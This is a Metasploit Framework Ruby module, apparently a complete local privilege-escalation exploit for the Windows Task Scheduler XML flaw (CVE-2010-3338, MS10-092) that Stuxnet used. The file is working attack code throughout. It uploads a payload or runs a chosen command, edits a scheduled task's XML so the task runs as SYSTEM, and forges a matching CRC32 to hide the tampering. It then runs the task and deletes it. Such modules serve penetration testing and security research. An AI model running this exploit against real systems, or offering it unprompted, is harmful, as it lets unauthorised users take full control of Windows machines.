##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'msf/core'
require 'msf/core/post/common'
require 'rex'
require 'zlib'
require 'msf/core/exploit/exe'
require 'msf/core/post/file'


class Metasploit3 < Msf::Exploit::Local
	Rank = ExcellentRanking

	include Msf::Exploit::EXE
	include Msf::Post::Common
	include Msf::Post::File

	def initialize(info={})
		super(update_info(info, {
			'Name'          => 'Windows Escalate Task Scheduler XML Privilege Escalation',
			'Description'   => %q{
					This module exploits the Task Scheduler 2.0 XML 0day exploited by Stuxnet.
				When processing task files, the Windows Task Scheduler only uses a CRC32
				checksum to validate that the file has not been tampered with. Also, In a default
				configuration, normal users can read and write the task files that they have
				created. By modifying the task file and creating a CRC32 collision, an attacker
				can execute arbitrary commands with SYSTEM privileges.

				NOTE: Thanks to webDEViL for the information about disable/enable.
			},
			'License'       => MSF_LICENSE,
			'Author'        => [ 'jduck' ],
			'Arch'          => [ ARCH_X86, ARCH_X86_64 ],
			'Platform'      => [ 'win' ],
			'SessionTypes'  => [ 'meterpreter' ],
			'Targets'       =>
				[
					[ 'Windows Vista, 7, and 2008', {} ],
				],
			'References'    =>
				[
					[ 'OSVDB', '68518' ],
					[ 'CVE', '2010-3338' ],
					[ 'BID', '44357' ],
					[ 'MSB', 'MS10-092' ],
					[ 'EDB', '15589' ]
				],
			'DisclosureDate'=> 'Sep 13 2010',
			'DefaultTarget' => 0
		}))

		register_options([
			OptString.new("CMD",      [ false, "Command to execute instead of a payload" ]),
			OptString.new("TASKNAME", [ false, "A name for the created task (default random)" ]),
		])

	end

	def check
		vuln = false
		winver = sysinfo["OS"]
		affected = [ 'Windows Vista', 'Windows 7', 'Windows 2008' ]
		affected.each { |v|
			if winver.include? v
				vuln = true
				break
			end
		}
		if not vuln
			return Exploit::CheckCode::Safe
		end

		return Exploit::CheckCode::Appears
	end

	def exploit
		if sysinfo["Architecture"] =~ /wow64/i
			#
			# WOW64 Filesystem Redirection prevents us opening the file directly. To make matters
			# worse, meterpreter/railgun creates things in a new thread, making it much more
			# difficult to disable via Wow64EnableWow64FsRedirection. Until we can get around this,
			# offer a workaround and error out.
			#
			print_error("Running against via WOW64 is not supported, try using an x64 meterpreter...")
			return
		end

		if check == Exploit::CheckCode::Safe
			print_error("#{winver} is not vulnerable.")
			return
		end

		taskname = datastore["TASKNAME"] || nil
		cmd = datastore["CMD"] || nil
		upload_fn = nil

		tempdir = session.fs.file.expand_path("%TEMP%")
		if not cmd
			# Get the exe payload.
			exe = generate_payload_exe
			#and placing it on the target in %TEMP%
			tempexename = Rex::Text.rand_text_alpha(rand(8)+6)
			cmd = tempdir + "\\" + tempexename + ".exe"

			print_status("Preparing payload at #{cmd}")
			write_file(cmd, exe)
		else
			print_status("Using command: #{cmd}")
		end

		#
		# Create a new task to do our bidding, but make sure it doesn't run.
		#
		taskname ||= Rex::Text.rand_text_alphanumeric(8+rand(8))
		sysdir = session.fs.file.expand_path("%SystemRoot%")
		taskfile = "#{sysdir}\\system32\\tasks\\#{taskname}"

		print_status("Creating task: #{taskname}")
		cmdline = "schtasks.exe /create /tn #{taskname} /tr \"#{cmd}\" /sc monthly /f"
#		print_debug("Will Execute:\n\t#{cmdline}")
		exec_schtasks(cmdline, "create the task")

		#
		# Read the contents of the newly creates task file
		#
		content = read_task_file(taskname, taskfile)

		#
		# Double-check that we got what we expect.
		#
		if content[0,2] != "\xff\xfe"
			#
			# Convert to unicode, since it isn't already
			#
			content = content.unpack('C*').pack('v*')
		else
			#
			# NOTE: we strip the BOM here to exclude it from the crc32 calculation
			#
			content = content[2,content.length]
		end


		#
		# Record the crc32 for later calculations
		#
		old_crc32 = crc32(content)
		print_status("Original CRC32: 0x%x" % old_crc32)

		#
		# Convert the file contents from unicode
		#
		content = content.unpack('v*').pack('C*')

		#
		# Mangle the contents to now run with SYSTEM privileges
		#
		content.gsub!('LeastPrivilege', 'HighestAvailable')
		content.gsub!(/<UserId>.*<\/UserId>/, '<UserId>S-1-5-18</UserId>')
		content.gsub!(/<Author>.*<\/Author>/, '<Author>S-1-5-18</Author>')
		#content.gsub!('<LogonType>InteractiveToken</LogonType>', '<LogonType>Password</LogonType>')
		content.gsub!('Principal id="Author"', 'Principal id="LocalSystem"')
		content.gsub!('Actions Context="Author"', 'Actions Context="LocalSystem"')
		content << "<!-- ZZ -->"

		#
		# Convert it back to unicode
		#
		content = Rex::Text.to_unicode(content)

		#
		# Fix it so the CRC matches again
		#
		fix_crc32(content, old_crc32)
		new_crc32 = crc32(content)
		print_status("Final CRC32: 0x%x" % new_crc32)

		#
		# Write the new content back
		#
		print_status("Writing our modified content back...")
		fd = session.fs.file.new(taskfile, "wb")
		fd.write "\xff\xfe" + content
		fd.close

		#
		# Validate our results
		#
		print_status("Validating task: #{taskname}")
		exec_schtasks("schtasks.exe /query /tn #{taskname}", "validate the task")

		#
		# Run the task :-)
		#
		print_status("Disabling the task...")
		exec_schtasks("schtasks.exe /change /tn #{taskname} /disable", "disable the task")

		print_status("Enabling the task...")
		exec_schtasks("schtasks.exe /change /tn #{taskname} /enable", "enable the task")

		print_status("Executing the task...")
		exec_schtasks("schtasks.exe /run /tn #{taskname}", "run the task")


		#
		# And delete it.
		#
		print_status("Deleting the task...")
		exec_schtasks("schtasks.exe /delete /f /tn #{taskname}", "delete the task")
	end

	def crc32(data)
		table = Zlib.crc_table
		crc = 0xffffffff
		data.unpack('C*').each { |b|
			crc = table[(crc & 0xff) ^ b] ^ (crc >> 8)
		}
		crc
	end

	def fix_crc32(data, old_crc)
		#
		# CRC32 stuff from ESET (presumably reversed from Stuxnet, which was presumably
		# reversed from Microsoft's code)
		#
		bwd_table = [
			0x00000000, 0xDB710641, 0x6D930AC3, 0xB6E20C82,
			0xDB261586, 0x005713C7, 0xB6B51F45, 0x6DC41904,
			0x6D3D2D4D, 0xB64C2B0C, 0x00AE278E, 0xDBDF21CF,
			0xB61B38CB, 0x6D6A3E8A, 0xDB883208, 0x00F93449,
			0xDA7A5A9A, 0x010B5CDB, 0xB7E95059, 0x6C985618,
			0x015C4F1C, 0xDA2D495D, 0x6CCF45DF, 0xB7BE439E,
			0xB74777D7, 0x6C367196, 0xDAD47D14, 0x01A57B55,
			0x6C616251, 0xB7106410, 0x01F26892, 0xDA836ED3,
			0x6F85B375, 0xB4F4B534, 0x0216B9B6, 0xD967BFF7,
			0xB4A3A6F3, 0x6FD2A0B2, 0xD930AC30, 0x0241AA71,
			0x02B89E38, 0xD9C99879, 0x6F2B94FB, 0xB45A92BA,
			0xD99E8BBE, 0x02EF8DFF, 0xB40D817D, 0x6F7C873C,
			0xB5FFE9EF, 0x6E8EEFAE, 0xD86CE32C, 0x031DE56D,
			0x6ED9FC69, 0xB5A8FA28, 0x034AF6AA, 0xD83BF0EB,
			0xD8C2C4A2, 0x03B3C2E3, 0xB551CE61, 0x6E20C820,
			0x03E4D124, 0xD895D765, 0x6E77DBE7, 0xB506DDA6,
			0xDF0B66EA, 0x047A60AB, 0xB2986C29, 0x69E96A68,
			0x042D736C, 0xDF5C752D, 0x69BE79AF, 0xB2CF7FEE,
			0xB2364BA7, 0x69474DE6, 0xDFA54164, 0x04D44725,
			0x69105E21, 0xB2615860, 0x048354E2, 0xDFF252A3,
			0x05713C70, 0xDE003A31, 0x68E236B3, 0xB39330F2,
			0xDE5729F6, 0x05262FB7, 0xB3C42335, 0x68B52574,
			0x684C113D, 0xB33D177C, 0x05DF1BFE, 0xDEAE1DBF,
			0xB36A04BB, 0x681B02FA, 0xDEF90E78, 0x05880839,
			0xB08ED59F, 0x6BFFD3DE, 0xDD1DDF5C, 0x066CD91D,
			0x6BA8C019, 0xB0D9C658, 0x063BCADA, 0xDD4ACC9B,
			0xDDB3F8D2, 0x06C2FE93, 0xB020F211, 0x6B51F450,
			0x0695ED54, 0xDDE4EB15, 0x6B06E797, 0xB077E1D6,
			0x6AF48F05, 0xB1858944, 0x076785C6, 0xDC168387,
			0xB1D29A83, 0x6AA39CC2, 0xDC419040, 0x07309601,
			0x07C9A248, 0xDCB8A409, 0x6A5AA88B, 0xB12BAECA,
			0xDCEFB7CE, 0x079EB18F, 0xB17CBD0D, 0x6A0DBB4C,
			0x6567CB95, 0xBE16CDD4, 0x08F4C156, 0xD385C717,
			0xBE41DE13, 0x6530D852, 0xD3D2D4D0, 0x08A3D291,
			0x085AE6D8, 0xD32BE099, 0x65C9EC1B, 0xBEB8EA5A,
			0xD37CF35E, 0x080DF51F, 0xBEEFF99D, 0x659EFFDC,
			0xBF1D910F, 0x646C974E, 0xD28E9BCC, 0x09FF9D8D,
			0x643B8489, 0xBF4A82C8, 0x09A88E4A, 0xD2D9880B,
			0xD220BC42, 0x0951BA03, 0xBFB3B681, 0x64C2B0C0,
			0x0906A9C4, 0xD277AF85, 0x6495A307, 0xBFE4A546,
			0x0AE278E0, 0xD1937EA1, 0x67717223, 0xBC007462,
			0xD1C46D66, 0x0AB56B27, 0xBC5767A5, 0x672661E4,
			0x67DF55AD, 0xBCAE53EC, 0x0A4C5F6E, 0xD13D592F,
			0xBCF9402B, 0x6788466A, 0xD16A4AE8, 0x0A1B4CA9,
			0xD098227A, 0x0BE9243B, 0xBD0B28B9, 0x667A2EF8,
			0x0BBE37FC, 0xD0CF31BD, 0x662D3D3F, 0xBD5C3B7E,
			0xBDA50F37, 0x66D40976, 0xD03605F4, 0x0B4703B5,
			0x66831AB1, 0xBDF21CF0, 0x0B101072, 0xD0611633,
			0xBA6CAD7F, 0x611DAB3E, 0xD7FFA7BC, 0x0C8EA1FD,
			0x614AB8F9, 0xBA3BBEB8, 0x0CD9B23A, 0xD7A8B47B,
			0xD7518032, 0x0C208673, 0xBAC28AF1, 0x61B38CB0,
			0x0C7795B4, 0xD70693F5, 0x61E49F77, 0xBA959936,
			0x6016F7E5, 0xBB67F1A4, 0x0D85FD26, 0xD6F4FB67,
			0xBB30E263, 0x6041E422, 0xD6A3E8A0, 0x0DD2EEE1,
			0x0D2BDAA8, 0xD65ADCE9, 0x60B8D06B, 0xBBC9D62A,
			0xD60DCF2E, 0x0D7CC96F, 0xBB9EC5ED, 0x60EFC3AC,
			0xD5E91E0A, 0x0E98184B, 0xB87A14C9, 0x630B1288,
			0x0ECF0B8C, 0xD5BE0DCD, 0x635C014F, 0xB82D070E,
			0xB8D43347, 0x63A53506, 0xD5473984, 0x0E363FC5,
			0x63F226C1, 0xB8832080, 0x0E612C02, 0xD5102A43,
			0x0F934490, 0xD4E242D1, 0x62004E53, 0xB9714812,
			0xD4B55116, 0x0FC45757, 0xB9265BD5, 0x62575D94,
			0x62AE69DD, 0xB9DF6F9C, 0x0F3D631E, 0xD44C655F,
			0xB9887C5B, 0x62F97A1A, 0xD41B7698, 0x0F6A70D9
		]

		crc = crc32(data[0, data.length - 12])
		data[-12, 4] = [crc].pack('V')

		data[-12, 12].unpack('C*').reverse.each { |b|
			old_crc = ((old_crc << 8) ^ bwd_table[old_crc >> 24] ^ b) & 0xffffffff
		}
		data[-12, 4] = [old_crc].pack('V')
	end

	def exec_schtasks(cmdline, purpose)
		cmdline = "/c #{cmdline.strip} && echo SCHELEVATOR"
		lns = cmd_exec('cmd.exe', cmdline)

		success = false
		lns.each_line { |ln|
			ln.chomp!
			if ln =~ /^SUCCESS\:\s/
				success = true
				print_status(ln)
			else
				print_status(ln)
			end
		}
	end


	def read_task_file(taskname, taskfile)
		print_status("Reading the task file contents from #{taskfile}...")

		# Can't read the file directly on 2008?
		content = ''
		fd = session.fs.file.new(taskfile, "rb")
		until fd.eof?
			content << fd.read
		end
		fd.close

		content
	end

end
